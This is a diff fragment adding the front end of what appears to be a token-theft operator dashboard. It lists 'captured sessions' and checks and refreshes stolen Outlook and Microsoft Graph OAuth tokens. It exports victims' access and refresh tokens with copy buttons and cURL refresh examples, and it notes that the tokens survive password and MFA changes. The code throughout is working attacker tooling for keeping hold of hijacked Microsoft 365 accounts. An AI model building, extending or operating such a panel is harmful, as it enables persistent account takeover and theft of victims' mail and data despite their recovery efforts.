+                                    <small>Expires: ${Math.floor(outlookStatus.expiresIn / 60)} min</small>` : 
+                                    '<span class="status-badge status-expired">No token</span>'
+                                }
+                            </td>
+                            <td>
+                                ${graphStatus ? 
+                                    `<span class="status-badge ${graphStatus.valid ? 'status-valid' : 'status-expired'}">
+                                        ${graphStatus.valid ? '✅ Valid' : '❌ Expired'}
+                                    </span><br>
+                                    <small>Expires: ${Math.floor(graphStatus.expiresIn / 60)} min</small>` : 
+                                    '<span class="status-badge status-expired">No token</span>'
+                                }
+                            </td>
+                            <td>
+                                ${outlookStatus ? `${Math.floor(outlookStatus.expiresIn / 60)} min` : '-'}
+                            </td>
+                            <td>
+                                <button onclick="checkStatusById('${session.sessionId}')" style="padding: 5px 10px; font-size: 12px;">🔍 Status</button>
+                                <button onclick="testTokenById('${session.sessionId}', 'outlook')" style="padding: 5px 10px; font-size: 12px; margin-top: 5px;">🧪 Test</button>
+                            </td>
+                        </tr>`;
+                    });
+                    
+                    html += '</table></div>';
+                    html += `<div style="margin-top: 20px; padding: 15px; background: #f8f9fa; border-radius: 8px;">
+                        <strong>📊 Summary:</strong> ${data.total} persistent sessions found<br>
+                        <small>✅ CAE-enabled tokens survive password and MFA changes</small>
+                    </div>`;
+                    
+                    document.getElementById('sessionsList').innerHTML = html;
+                } else {
+                    document.getElementById('sessionsList').innerHTML = `
+                        <div style="text-align: center; padding: 40px; color: #999;">
+                            📭 No persistent sessions found. Use the Migrate tab to add tokens.
+                        </div>
+                    `;
+                }
+            } catch (error) {
+                document.getElementById('sessionsList').innerHTML = `
+                    <div class="alert alert-error">
+                        ❌ Error loading sessions: ${error.message}
+                    </div>
+                `;
+            }
+        }
+        
+        async function loadStats() {
+            try {
+                const response = await fetch(`${API_BASE}/captured-sessions`);
+                const data = await response.json();
+                
+                document.getElementById('totalSessions').innerHTML = data.total || 0;
+                
+                // Get migrated count
+                const persistentResponse = await fetch(`${API_BASE}/api/persistent-sessions`);
+                const persistentData = await persistentResponse.json();
+                document.getElementById('migratedSessions').innerHTML = persistentData.total || 0;
+                document.getElementById('failedSessions').innerHTML = (data.total || 0) - (persistentData.total || 0);
+            } catch (error) {
+                console.error('Error loading stats:', error);
+            }
+        }
+        
+        async function checkStatus() {
+            const sessionId = document.getElementById('statusSessionId').value.trim();
+            
+            if (!sessionId) {
+                showAlert('❌ Please enter a session ID', 'error', 'statusResult');
+                return;
+            }
+            
+            await checkStatusById(sessionId);
+        }
+        
+        async function checkStatusById(sessionId) {
+            try {
+                const response = await fetch(`${API_BASE}/api/token-status/${sessionId}?test=true`);
+                const data = await response.json();
+                
+                if (data.tokenStatus) {
+                    let html = '<div style="margin-top: 20px;">';
+                    html += `<div class="alert alert-info">✅ Token Status for session: <code>${sessionId}</code></div>`;
+                    html += '<div class="grid-2">';
+                    
+                    for (const [resource, status] of Object.entries(data.tokenStatus)) {
+                        const validClass = status.valid ? 'status-valid' : 'status-expired';
+                        const validText = status.valid ? '✅ Valid' : '❌ Expired';
+                        
+                        html += `
+                            <div style="background: #f8f9fa; padding: 15px; border-radius: 10px;">
+                                <h3>${resource.toUpperCase()}</h3>
+                                <p><strong>Status:</strong> <span class="status-badge ${validClass}">${validText}</span></p>
+                                <p><strong>Expires In:</strong> ${Math.floor(status.expiresIn / 60)} minutes (${status.expiresIn} seconds)</p>
+                                <p><strong>Expires At:</strong> ${new Date(status.expiresAt).toLocaleString()}</p>
+                                <p><strong>Last Refresh:</strong> ${new Date(status.lastRefresh).toLocaleString()}</p>
+                                <p><strong>Refresh Count:</strong> ${status.refreshCount}</p>
+                                <p><strong>CAE Enabled:</strong> ${status.caeEnabled ? '✅ Yes' : '❌ No'}</p>
+                                <p><strong>Scopes:</strong> ${status.scopes}</p>
+                            </div>
+                        `;
+                    }
+                    
+                    html += '</div>';
+                    
+                    if (data.tokenStatus.outlook?.testResult) {
+                        const test = data.tokenStatus.outlook.testResult;
+                        if (test.valid) {
+                            html += `<div class="alert alert-success" style="margin-top: 20px;">
+                                ✅ Test successful! Token can access: ${test.user?.userPrincipalName || test.user?.mail || 'User profile'}
+                            </div>`;
+                        } else if (test.requiresClaimsRefresh) {
+                            html += `<div class="alert alert-warning" style="margin-top: 20px;">
+                                ⚠️ Claims challenge detected - token will auto-refresh on next use
+                            </div>`;
+                        }
+                    }
+                    
+                    html += '</div>';
+                    document.getElementById('statusResult').innerHTML = html;
+                } else {
+                    document.getElementById('statusResult').innerHTML = `
+                        <div class="alert alert-error">
+                            ❌ No tokens found for this session
+                        </div>
+                    `;
+                }
+            } catch (error) {
+                document.getElementById('statusResult').innerHTML = `
+                    <div class="alert alert-error">
+                        ❌ Error checking status: ${error.message}
+                    </div>
+                `;
+            }
+        }
+        
+        async function testToken() {
+            const sessionId = document.getElementById('testSessionId').value.trim();
+            const resource = document.getElementById('testResource').value;
+            
+            if (!sessionId) {
+                showAlert('❌ Please enter a session ID', 'error', 'testResult');
+                return;
+            }
+            
+            await testTokenById(sessionId, resource);
+        }
+        
+        async function testTokenById(sessionId, resource) {
+            const resultDiv = document.getElementById('testResult');
+            resultDiv.innerHTML = '<div style="text-align: center; padding: 20px;"><span class="spinner"></span> Testing token...</div>';
+            
+            try {
+                const response = await fetch(`${API_BASE}/api/test-persistent/${sessionId}/${resource}`);
+                const data = await response.json();
+                
+                if (data.success) {
+                    let html = `<div class="alert alert-success" style="margin-top: 20px;">
+                        ✅ <strong>Token is valid!</strong><br>
+                        User: ${data.user?.userPrincipalName || data.user?.mail || 'N/A'}<br>
+                        Display Name: ${data.user?.displayName || 'N/A'}
+                    </div>`;
+                    
+                    if (data.tokenStatus) {
+                        html += `<div class="alert alert-info" style="margin-top: 10px;">
+                            <strong>Token Status:</strong><br>
+                            Expires In: ${Math.floor(data.tokenStatus.expiresIn / 60)} minutes<br>
+                            Refresh Count: ${data.tokenStatus.refreshCount}<br>
+                            CAE Enabled: ${data.tokenStatus.caeEnabled ? 'Yes' : 'No'}
+                        </div>`;
+                    }
+                    
+                    resultDiv.innerHTML = html;
+                } else {
+                    resultDiv.innerHTML = `<div class="alert alert-error">
+                        ❌ Token test failed: ${data.error || 'Unknown error'}
+                    </div>`;
+                }
+            } catch (error) {
+                resultDiv.innerHTML = `<div class="alert alert-error">
+                    ❌ Error testing token: ${error.message}
+                </div>`;
+            }
+        }
+        
+        async function exportTokens() {
+            const sessionId = document.getElementById('exportSessionId').value.trim();
+            
+            if (!sessionId) {
+                showAlert('❌ Please enter a session ID', 'error', 'exportResult');
+                return;
+            }
+            
+            try {
+                const response = await fetch(`${API_BASE}/api/export-persistent/${sessionId}`);
+                const data = await response.json();
+                
+                if (data.tokens) {
+                    let html = `<div class="alert alert-success" style="margin-top: 20px;">
+                        ✅ Tokens exported for session: <code>${sessionId}</code><br>
+                        Email: ${data.email || 'N/A'}
+                    </div>`;
+                    
+                    html += '<div class="grid-2">';
+                    
+                    for (const [resource, token] of Object.entries(data.tokens)) {
+                        html += `
+                            <div style="background: #f8f9fa; padding: 15px; border-radius: 10px;">
+                                <h3>${resource.toUpperCase()}</h3>
+                                <p><strong>Access Token:</strong></p>
+                                <div class="code-block" style="font-size: 10px; word-break: break-all;">${token.access_token.substring(0, 100)}...</div>
+                                <p><strong>Refresh Token:</strong></p>
+                                <div class="code-block" style="font-size: 10px; word-break: break-all;">${token.refresh_token.substring(0, 100)}...</div>
+                                <p><strong>Expires In:</strong> ${Math.floor(token.expires_in_seconds / 60)} minutes</p>
+                                <p><strong>Refresh Count:</strong> ${token.refresh_count}</p>
+                                <button onclick="copyToClipboard('${token.refresh_token}')" style="margin-top: 10px; padding: 5px 10px;">📋 Copy Refresh Token</button>
+                            </div>
+                        `;
+                    }
+                    
+                    html += '</div>';
+                    
+                    if (data.refresh_examples) {
+                        html += '<h3 style="margin-top: 20px;">🔄 Refresh Examples</h3>';
+                        for (const [resource, example] of Object.entries(data.refresh_examples)) {
+                            html += `
+                                <div style="margin-top: 15px;">
+                                    <h4>${resource.toUpperCase()} - cURL</h4>
+                                    <div class="code-block" style="font-size: 11px;">${example.curl}</div>
+                                </div>
+                            `;
+                        }
+                    }
+                    
+                    document.getElementById('exportResult').innerHTML = html;
+                } else {
+                    document.getElementById('exportResult').innerHTML = `
+                        <div class="alert alert-error">
+                            ❌ No tokens found for this session
+                        </div>
+                    `;
+                }
+            } catch (error) {
+                document.getElementById('exportResult').innerHTML = `
+                    <div class="alert alert-error">
+                        ❌ Error exporting tokens: ${error.message}
+                    </div>
+                `;
+            }
+        }
+        
+        function copyToClipboard(text) {
+            navigator.clipboard.writeText(text).then(() => {
+                showAlert('✅ Copied to clipboard!', 'success', 'exportResult');
+            }).catch(() => {
+                showAlert('❌ Failed to copy', 'error', 'exportResult');
+            });
+        }
+        
+        // Load initial stats if on bulk tab
+        window.addEventListener('load', () => {
+            loadStats();
+        });
+    </script>
+</body>
+</html>
